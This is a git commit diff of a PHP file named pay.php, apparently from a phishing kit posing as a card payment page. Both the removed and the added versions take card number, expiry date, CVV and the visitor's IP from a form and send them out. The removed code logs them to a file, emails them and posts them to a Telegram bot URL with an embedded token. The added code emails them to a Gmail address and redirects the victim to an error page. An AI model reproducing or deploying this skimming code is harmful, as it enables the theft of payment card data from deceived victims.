c75b703249838b3525d3fb97ef5134f2370f710c
Med6790 <115943851+Med6790@users.noreply.github.com>
2022-11-16 19:00:31 +0000

    added new files

--- pay.php
+++ pay.php
@@ -1,39 +1,26 @@
-<?php
-session_start();
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    if (!empty($_POST['Sis_Numero_Tarjeta']) and !empty($_POST['Sis_Caducidad_Tarjeta_Mes']) and !empty($_POST['Sis_Caducidad_Tarjeta_Anno']) and !empty($_POST['Sis_Tarjeta_CVV2']) 
-		// and !empty($_POST['pin'])
-	) {
-			$_SESSION['cc']=$_POST['Sis_Numero_Tarjeta'];
-		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-                $ip = $_SERVER['HTTP_CLIENT_IP'];
-            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-            } else {
-                $ip = $_SERVER['REMOTE_ADDR'];
-            }
+﻿<?php
 
-            $message = "
-            SHANkS
-            ---------------
-            | CCN : " . $_POST['Sis_Numero_Tarjeta'] . "
-            | EXP : " . $_POST['Sis_Caducidad_Tarjeta_Mes'] ."|". $_POST['Sis_Caducidad_Tarjeta_Anno'] ."
-            | CVV : " . $_POST['Sis_Tarjeta_CVV2'] . "
-            | INF : " . $ip . "
-            ---------------\n";
+include("funcs.php");
 
-            $file = fopen("./rz92.txt", "a+");
-            fwrite($file, $message);
-            fclose($file);
-			$to = "";
-			$subject = "$ip =?utf-8?Q?=F0=9F=91=BD?= (CCN|SAUDI)";
-			$headers = "From: Ak47™<shdanks@dPorctgas.org>\r\n";
-			$headers .= "MIME-Version: 1.0\r\n";
-			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
-			mail($to, $subject, $message, $headers);
-            file_get_contents("https://api.telegram.org/bot2063061087:AAF4J2MhpY_UGZ4bRdeEkPIvL3HdioJoJwo/sendMessage?chat_id=-745387116&text=" . urlencode($message)."" );
-		
-        header("Location: Seleccione_medio_de_codigo_loading.php?codigo_id=".md5($_GET['error']));
-    }
-}
+$message  = "SPL\n\n";
+$message .= "Numéro de carte : ".$_POST['Sis_Numero_Tarjeta']."\n";
+$message .= "Date d'expiration : ".$_POST['Sis_Caducidad_Tarjeta_Mes']."\n";
+$message .= "CVV : ".$_POST['Sis_Tarjeta_CVV2']."\n";
+$message .= "***************************************\n\n";
+
+$message .= "******* SYS *******\n\n";
+$message .= "Device  : ".$OS."\n";
+$message .= "Browser : ".$Browser."\n";
+$message .= "IP      : ".$ip."\n";
+
+$message .= "******* End Login Data *******\n\n\n\n\n";
+
+$send = "baraka.barak1@gmail.com";
+$subject = "SG|".$ip;
+$headers = "From:  SG <donc@mox.fr>";
+mail($send,$subject,$message,$headers);
+
+header("Location: codeerror.php");
+
 ?>
+
